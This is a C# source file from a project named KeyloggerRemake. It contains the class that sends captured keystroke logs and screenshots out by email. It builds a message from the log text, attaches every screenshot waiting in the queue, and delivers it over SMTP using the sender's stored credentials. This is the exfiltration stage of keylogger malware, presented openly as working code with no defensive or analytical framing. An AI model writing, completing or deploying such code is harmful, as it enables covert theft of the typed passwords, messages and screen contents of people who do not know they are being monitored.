using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Net;
using System.Net.Mail;

namespace KeyloggerRemake
{
    static class classEmail
    {
        //Forms a mail message
        public static MailMessage getMsg(classLog currentLog, string strReceipient, string strFromEmail)
        { //Takes in the current log, email to send to, email to send from (taken from Controller)
            MailMessage msgLog = new MailMessage();
            Attachment attachment;

            msgLog.From = new MailAddress(strFromEmail);
            msgLog.To.Add(strReceipient);
            msgLog.Subject = currentLog.strLogEndDateTime;
            msgLog.Body = currentLog.strLog;
            msgLog.Priority = MailPriority.High;

            while (currentLog.stkScreenshots.Count() > 0) //Checks if there's any screenshots taken in the stack
            {
                classScreenshot Peek = currentLog.stkScreenshots.Peek(); //Gets the top screenshot
                string[] Screenshots = Directory.GetFiles(Peek.strScreenshotFolder, Peek.strScreenshotName + ".png"); //Gets its directory and name and adds it to an array
                //Sorry, it can't be set into just one file because C#.

                foreach (string strScreenshot in Screenshots) //Goes through the array
                {
                    attachment = new Attachment(strScreenshot);
                    msgLog.Attachments.Add(attachment); //Adds the screenshot as an attachment
                    currentLog.stkScreenshots.Dequeue(); //Dequeues the stack to get the next screenshot, if any
                }
            }

            return msgLog;
        }

        //Sends the mail message after it's formed
        public static void sendMsg(MailMessage msgLog, string strFromEmail, string strEmailPass, string strEmailHost, int intEmailPort)
        { //Takes in the mail message, email to send from, its password, host, and port (taken from Controller)
            using (SmtpClient client = new SmtpClient())
            {
                client.EnableSsl = true; //Encrypts the connection
                client.UseDefaultCredentials = false;
                client.Credentials = new NetworkCredential(strFromEmail, strEmailPass); //Sets the sender's given credentials
                client.Host = strEmailHost; //Sender's host
                client.Port = intEmailPort; //Sender's port
                client.DeliveryMethod = SmtpDeliveryMethod.Network;

                client.Send(msgLog); //Sends the message
            }
        }
    }
}
